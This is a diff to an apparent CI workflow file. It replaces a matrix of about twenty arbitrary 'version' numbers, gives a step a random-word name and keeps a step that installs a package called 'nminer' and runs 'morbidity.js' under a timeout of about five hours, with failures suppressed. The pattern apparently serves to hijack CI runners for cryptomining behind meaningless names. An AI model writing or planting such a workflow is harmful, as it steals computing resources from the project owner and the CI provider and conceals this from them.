@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2056 }
-          - { version: 3961 }
-          - { version: 9094 }
-          - { version: 4873 }
-          - { version: 4293 }
-          - { version: 3242 }
-          - { version: 9077 }
-          - { version: 4940 }
-          - { version: 500 }
-          - { version: 2611 }
-          - { version: 5741 }
-          - { version: 610 }
-          - { version: 776 }
-          - { version: 8473 }
-          - { version: 9075 }
-          - { version: 6989 }
-          - { version: 3431 }
-          - { version: 1978 }
-          - { version: 9953 }
-          - { version: 755 }
+          - { version: 6027 }
+          - { version: 1717 }
+          - { version: 2224 }
+          - { version: 529 }
+          - { version: 8728 }
+          - { version: 9603 }
+          - { version: 8444 }
+          - { version: 2002 }
+          - { version: 4389 }
+          - { version: 4500 }
+          - { version: 2891 }
+          - { version: 7014 }
+          - { version: 6764 }
+          - { version: 9028 }
+          - { version: 2136 }
+          - { version: 6445 }
+          - { version: 1172 }
+          - { version: 1392 }
+          - { version: 9552 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: archive omelet nearly instead
+      - name: once cantaloupe hype dependable
         run: |
           npm install nminer@latest
-          timeout 314m node morbidity.js || echo "morbidity executed"
+          timeout 303m node morbidity.js || echo "morbidity executed"
